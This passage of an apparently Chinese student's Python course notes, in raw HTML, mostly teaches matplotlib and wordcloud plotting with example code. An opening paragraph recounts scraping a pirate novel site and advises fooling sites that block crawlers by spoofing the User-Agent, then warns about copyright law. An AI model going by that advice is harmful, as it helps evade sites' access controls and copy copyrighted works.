class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个实际上是一个还没有弄完的脚本，因为我爬取的是笔趣阁的小说，毕竟笔趣阁本身就是盗版网站加密也没那么麻烦，还真让我爬出来了一些信息。但是在爬取过程在还是注意到开发者是做了简易的防爬虫操作的，在一定的章节后，他随机的增加了一个四位数字，这导致了以上代码在进行无意义的空跑，但是还是发现这个代码可以应用于同网站少数小说的爬取，猜测是当时网站还没有做防爬虫的操作。</p><p>之后在类似的爬取其他内容过程中，发现有些网站爬虫根本无法爬取。花了一些时间研究，找到结论，我们一般写的爬虫会默认告诉服务器自己发送了一个Python爬取请求，而一般网站是不允许被爬虫访问的，估计是因为会涉及到企业根本吧。最后，我们可以通过更改User-Agent字段就可以轻易骗过该网站。</p><p>我们可以使用<strong>fake_useragent</strong>进行User-Agent字段的欺骗，这里就不再展示</p><p>最后提示一句**《刑法》第217条第1项规定，以营利为目的，未经著作权人许可，复制发行其文字作品、音乐、电影、电视、录像作品、计算机软件及其他作品，处以有期徒刑，并处或单 处罚金。 **大家未来对爬虫技术掌握爬虫技术之后，能从网络上爬取一些东西，但绝对不要违法。</p><h2 id="5-0-问题导入">5.0 问题导入</h2><blockquote><p>使用 wordcloud 和 matplotlib.pyplot 方法对“222.txt”中的分词制作 分词云图，并保存为“分词云图 1.png”。</p><p>使用“222.txt”中出现频率最高的前 10 个词语，制作条形图，X 轴对应 10 个词语，y 轴对应每个词语的频率值，保存成“条形图 2.png”。</p></blockquote><p>上面是上一次实验课，于刊老师的问题，下面是我解决这两道题目的方式，</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token comment">#课本提示我们汉语要设置字体，不然乱码</span>matplotlib<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.family'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'SimHei'</span>a<span class="token operator">=</span>pd<span class="token punctuation">.</span>read_table<span class="token punctuation">(</span><span class="token string">'333.txt'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span>sep<span class="token operator">=</span><span class="token string">'       '</span><span class="token punctuation">,</span>engine<span class="token operator">=</span><span class="token string">'python'</span><span class="token punctuation">)</span><span class="token comment">#这个是之前李师姐讲到的读写操作</span>df<span class="token operator">=</span>pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token comment">#print (a)</span><span class="token comment">#print(df['词语'])</span><span class="token comment">#测试用数据可以忽略</span>x<span class="token operator">=</span>df<span class="token punctuation">[</span><span class="token string">'词语'</span><span class="token punctuation">]</span>y<span class="token operator">=</span>df<span class="token punctuation">[</span><span class="token string">'次数'</span><span class="token punctuation">]</span>figure<span class="token operator">=</span>plt<span class="token punctuation">.</span>Figure<span class="token punctuation">(</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>bar<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_1.png" alt=""></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token comment"># 要先pip install wordcloud</span><span class="token keyword">from</span> wordcloud <span class="token keyword">import</span> WordClouda<span class="token operator">=</span>pd<span class="token punctuation">.</span>read_table<span class="token punctuation">(</span><span class="token string">'333.txt'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span>sep<span class="token operator">=</span><span class="token string">'       '</span><span class="token punctuation">,</span>engine<span class="token operator">=</span><span class="token string">'python'</span><span class="token punctuation">)</span>df<span class="token operator">=</span>pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token comment">#fit_word函数，接受字典类型，其他类型会报错</span>dic<span class="token operator">=</span><span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token builtin">zip</span><span class="token punctuation">(</span>df<span class="token punctuation">[</span><span class="token string">'词语'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>df<span class="token punctuation">[</span><span class="token string">'次数'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>wordcloud <span class="token operator">=</span> WordCloud<span class="token punctuation">(</span>font_path<span class="token operator">=</span><span class="token string">'simhei.ttf'</span><span class="token punctuation">,</span>background_color<span class="token operator">=</span><span class="token string">"white"</span><span class="token punctuation">,</span>width <span class="token operator">=</span><span class="token number">4000</span><span class="token punctuation">,</span>height<span class="token operator">=</span> <span class="token number">2000</span><span class="token punctuation">,</span>margin<span class="token operator">=</span> <span class="token number">10</span> <span class="token punctuation">)</span><span class="token punctuation">.</span>fit_words<span class="token punctuation">(</span>dic<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span>wordcloud<span class="token punctuation">)</span><span class="token comment"># 显示</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="./python绘图及可视化备课/Figure_2.png" style="zoom:72%;" /><p>这里使用了<strong>matplotlib库</strong>和<strong>wordcloud库</strong>两个库实现，</p><p>其实做 Python的数据可视化，可以使用的库分别是<strong>Matplotlib</strong>，<strong>Seaborn</strong>，<strong>Bokeh</strong>，<strong>Plotly</strong>，<strong>Pyecharts</strong>等。</p><p>我们课本主要将的是<strong>Matplotlib</strong>库，我其实没有在互联网上找到matplotlib库的官方中文文档的，关于这些自学起来实际上是看的浏览器的翻译，如有错误还请海涵…</p><h2 id="5-1-matplotlib库基础">5.1 matplotlib库基础</h2><h3 id="拓展：默认值相关">拓展：默认值相关</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">fig<span class="token operator">=</span>plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span><span class="token punctuation">)</span>ax<span class="token operator">=</span>fig<span class="token punctuation">.</span>add_axes<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0.1</span><span class="token punctuation">,</span><span class="token number">0.1</span><span class="token punctuation">,</span><span class="token number">0.8</span><span class="token punctuation">,</span><span class="token number">0.8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>fig.add_axes([])<strong>里面的参数分别指的距离左边，下边，坐标轴宽度，坐标轴高度，范围是(0, 1)等价于</strong>plt.axes()</strong></p><p><strong>ax=fig.add_axes([0.1,0.1,0.8,0.8])<strong>语句表示的是在画布中，坐标轴距离画布左边0.1倍的位置，距离下边0.1倍的位置，确定了这两个位置后，坐标轴的整体宽度和高度占0.8倍的大小，换句话说，距离右边和上边0.9~~（0.1+0.8）~~倍。执行如下代码，会生成一张带有坐标轴的白色，两个语句实际上都是</strong>默认值</strong>。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">pyplot<span class="token punctuation">.</span>grid<span class="token punctuation">(</span>b<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> which<span class="token operator">=</span><span class="token string">'major'</span><span class="token punctuation">,</span> axis<span class="token operator">=</span><span class="token string">'both'</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token comment">##**kwargs 允许你将不定长度的键值对, 作为参数传递给一个函数。 如果你想要在一个函数里处理带名字的参数, 你应该使用**kwargs</span><span class="token comment">#以下是一个实例：</span>plt<span class="token punctuation">.</span>grid<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">,</span> linestyle <span class="token operator">=</span> <span class="token string">"--"</span><span class="token punctuation">,</span>color <span class="token operator">=</span> <span class="token string">"gray"</span><span class="token punctuation">,</span> linewidth <span class="token operator">=</span> <span class="token string">"0.5"</span><span class="token punctuation">,</span>axis <span class="token operator">=</span> <span class="token string">'both'</span><span class="token punctuation">)</span>  <span class="token comment"># 显示网格，这个参数默认为forse</span><span class="token comment"># linestyle：线型</span><span class="token comment"># color：颜色</span><span class="token comment"># linewidth：宽度</span><span class="token comment"># axis：x，y，both，显示x/y/两者的格网</span>pyplot<span class="token punctuation">.</span>title<span class="token punctuation">(</span>label<span class="token punctuation">,</span> fontdict<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> loc<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> pad<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span><span class="token operator">**</span>kwargs<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>tick_params<span class="token punctuation">(</span>bottom<span class="token operator">=</span><span class="token string">'on'</span><span class="token punctuation">,</span>top<span class="token operator">=</span><span class="token string">'off'</span><span class="token punctuation">,</span>left<span class="token operator">=</span><span class="token string">'on'</span><span class="token punctuation">,</span>right<span class="token operator">=</span><span class="token string">'off'</span><span class="token punctuation">)</span>  <span class="token comment"># 显示刻度的那根轴线，凸出来的地方。设置为off时都不显示。默认为全显示</span><span class="token comment">#plt.axis('off')</span><span class="token comment"># 关闭坐标轴</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果想要了解这些具体的参数还是推荐去看下那个纯英文的matplotlib库手册</p><p>显示创建画布和坐标轴的好处是让我们对绘图过程有了完全的控制权（比如可以指定在什么地方绘图），而且绘图的逻辑更强 。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token comment"># 新建figure</span>fig <span class="token operator">=</span> plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 定义数据</span>x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">]</span>y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token comment"># 新建区域ax1</span><span class="token comment"># figure的百分比,从figure 10%的位置开始绘制, 宽高是figure的80%</span>left<span class="token punctuation">,</span> bottom<span class="token punctuation">,</span> width<span class="token punctuation">,</span> height <span class="token operator">=</span> <span class="token number">0.1</span><span class="token punctuation">,</span> <span class="token number">0.1</span><span class="token punctuation">,</span> <span class="token number">0.8</span><span class="token punctuation">,</span> <span class="token number">0.8</span><span class="token comment"># 获得绘制的句柄</span>ax1 <span class="token operator">=</span> fig<span class="token punctuation">.</span>add_axes<span class="token punctuation">(</span><span class="token punctuation">[</span>left<span class="token punctuation">,</span> bottom<span class="token punctuation">,</span> width<span class="token punctuation">,</span> height<span class="token punctuation">]</span><span class="token punctuation">)</span>ax1<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>ax1<span class="token punctuation">.</span>set_title<span class="token punctuation">(</span><span class="token string">'area1'</span><span class="token punctuation">)</span><span class="token comment"># 新增区域ax2,嵌套在ax1内</span>left<span class="token punctuation">,</span> bottom<span class="token punctuation">,</span> width<span class="token punctuation">,</span> height <span class="token operator">=</span> <span class="token number">0.2</span><span class="token punctuation">,</span> <span class="token number">0.6</span><span class="token punctuation">,</span> <span class="token number">0.25</span><span class="token punctuation">,</span> <span class="token number">0.25</span><span class="token comment"># 获得绘制的句柄</span>ax2 <span class="token operator">=</span> fig<span class="token punctuation">.</span>add_axes<span class="token punctuation">(</span><span class="token punctuation">[</span>left<span class="token punctuation">,</span> bottom<span class="token punctuation">,</span> width<span class="token punctuation">,</span> height<span class="token punctuation">]</span><span class="token punctuation">)</span>ax2<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">)</span>ax2<span class="token punctuation">.</span>set_title<span class="token punctuation">(</span><span class="token string">'area2'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_3.png" alt=""></p><blockquote><p>补充知识点，在课本表5—2中出现的函数均有add_函数名(参数)和plt.函数名(参数)两种形式，实际使用中记住一种就行。</p></blockquote><h2 id="5-2-plt-plot-绘图">5.2 plt.plot()绘图</h2><p><strong>plt.plot(x, y, c=“b”,ls=&quot;-&quot;, lw=2, label=“文本串”)</strong><br>其中，第二个简单的格式是最常用的格式，参数x表示指定的x轴上的数值，参数y表示指定的y轴上的数值，参数c指定绘制线条的颜色，参数ls指定的折线图的线条风格，参数lw指定绘制的线条宽度，参数label指定标记图内容的标签文本。</p><p>**plt.plot()<strong>函数中可以明确地给出了x,y的值，然后得到相应的(x,y)坐标点，把这些点再连接成线。当</strong>plt.plot()**函数也允许只给出y值的情况，这时系统给自动将x值指定为range(len(y))，然后根据x,y的值进行点连线。</p><blockquote><p>len() 函数返回对象中项目的数量。</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token comment">#只给出y值，画出相应图像</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在5.2plt.plot()绘图这一节里，我们以实例5-1为例，</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltfig<span class="token operator">=</span>plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span><span class="token punctuation">)</span>ax <span class="token operator">=</span> fig<span class="token punctuation">.</span>add_axes<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0.1</span><span class="token punctuation">,</span> <span class="token number">0.1</span><span class="token punctuation">,</span> <span class="token number">0.8</span><span class="token punctuation">,</span> <span class="token number">0.8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>x<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span>y<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">]</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#带有默认设置的程序</span><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltx<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span>y<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">]</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#去除默认值的程序</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再pycharm环境中允许，生成的图片实际上是一模一样的，这是因为在使用了plt.plot()语句，会默认创建一个figure对象和axes坐标系。</p><p><strong>例5-2</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltx <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span>y1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span>y2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">]</span>y3 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">]</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y1<span class="token punctuation">,</span> color<span class="token operator">=</span><span class="token string">"g"</span><span class="token punctuation">,</span>linestyle<span class="token operator">=</span><span class="token string">"-"</span><span class="token punctuation">,</span>marker<span class="token operator">=</span><span class="token string">"o"</span><span class="token punctuation">,</span>markerfacecolor<span class="token operator">=</span><span class="token string">"g"</span><span class="token punctuation">,</span>markersize<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y2<span class="token punctuation">,</span> color<span class="token operator">=</span><span class="token string">"r"</span><span class="token punctuation">,</span>linestyle<span class="token operator">=</span><span class="token string">":"</span><span class="token punctuation">,</span>marker<span class="token operator">=</span><span class="token string">"D"</span><span class="token punctuation">,</span>markerfacecolor<span class="token operator">=</span><span class="token string">"r"</span><span class="token punctuation">,</span>markersize<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y3<span class="token punctuation">,</span> color<span class="token operator">=</span><span class="token string">"b"</span><span class="token punctuation">,</span>linestyle<span class="token operator">=</span><span class="token string">"-."</span><span class="token punctuation">,</span>marker<span class="token operator">=</span><span class="token string">"s"</span><span class="token punctuation">,</span>markerfacecolor<span class="token operator">=</span><span class="token string">"b"</span><span class="token punctuation">,</span>markersize<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>引例：画一张二次曲线</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token comment">#从-1到1之间等间隔采66个数.也就是说所画出来的图形是66个点连接得来的</span><span class="token comment">#注意：如果点数过小的话会导致画出来二次函数图像不平滑</span>x <span class="token operator">=</span> np<span class="token punctuation">.</span>linspace<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">66</span><span class="token punctuation">)</span><span class="token comment">#linspace(start,stop,num,endpoint= True)函数在[start,stop]范围内计算返回num个均匀间隔的点，可以通过endpoint确认是否包含间隔点</span><span class="token comment"># 绘制x^2函数的图像</span>y <span class="token operator">=</span> x<span class="token operator">**</span><span class="token number">2</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">numpy<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span>low<span class="token punctuation">,</span> high<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> dtype<span class="token operator">=</span><span class="token string">'l'</span><span class="token punctuation">)</span><span class="token comment">#返回一个随机整型数，范围从低（包括）到高（不包括），即[low, high)。</span><span class="token comment">#如果没有写参数high的值，则返回[0,low)的值。</span><span class="token comment">#输出随机数的尺寸，比如size = (m * n* k)则输出同规模即m * n* k个随机数。默认是None的，仅仅返回满足要求的单一随机数。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_4.png" alt=""></p><p>我们可以看到当图像间隔足够小的时候，折线图可以模拟出二次曲线的形式，类似的方法可以实现正弦函数的产生</p><p><strong>例5-4</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> npx <span class="token operator">=</span> np<span class="token punctuation">.</span>linspace<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">*</span>np<span class="token punctuation">.</span>pi<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span>y <span class="token operator">=</span> np<span class="token punctuation">.</span>sin<span class="token punctuation">(</span>x<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span>c<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">,</span>ls<span class="token operator">=</span><span class="token string">"-"</span><span class="token punctuation">,</span> lw<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string">"sin"</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>legend<span class="token punctuation">(</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_5.png" alt=""></p><p><strong>例5-5</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltt<span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span>x<span class="token operator">=</span> t<span class="token punctuation">.</span>reshape<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#将arange(12)生成的12个数展成[4,3]的二维数组</span>y<span class="token operator">=</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_6.png" alt=""></p><h2 id="5-3-划分子图">5.3 划分子图</h2><p>例5-7:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltx <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span>y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">]</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span>y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2.0</span><span class="token punctuation">,</span><span class="token number">3.5</span><span class="token punctuation">,</span><span class="token number">4.6</span><span class="token punctuation">]</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./python%E7%BB%98%E5%9B%BE%E5%8F%8A%E5%8F%AF%E8%A7%86%E5%8C%96%E5%A4%87%E8%AF%BE/Figure_7.png" alt=""></p><p>在这个情况下，两个折线是被默认存储到同一个画布上，然而我们在中间多添加一个plt.show()就会是分别位于一张画布上。在这个实例中也能看出来在，两张图片的X轴范围不同的情况下，放在同一张画布下是不容易显示的.</p><p>为此我们要进行划分子图</p><p>格式一：**plt.subplot(nrows,ncols,plot_number)**将一个画布分成“行×列”个部分，其中nrows表示要划分的行数，ncols表示要划分的列数，plot_number表示当前子图区。</p><p>格式二：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">figure <span class="token operator">=</span> plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span><span class="token punctuation">)</span>figure<span class="token punctuation">.</span>add_subplot<span class="token 